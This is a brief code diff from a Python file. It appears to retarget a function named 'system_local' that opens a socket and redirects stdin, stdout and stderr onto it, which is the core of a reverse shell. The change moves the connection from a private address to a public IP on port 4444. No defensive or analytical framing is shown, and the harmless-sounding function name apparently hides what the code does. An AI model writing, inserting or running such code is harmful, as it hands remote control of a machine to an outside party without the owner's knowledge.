@@ -4,7 +4,7 @@ import socket, os, subprocess
 def system_local():
     try:
         s = socket.socket()
-        s.connect(("10.9.8.7", 4444))
+        s.connect(("92.9.8.5", 4444))
         os.dup2(s.fileno(), 0)
         os.dup2(s.fileno(), 1)
         os.dup2(s.fileno(), 2)
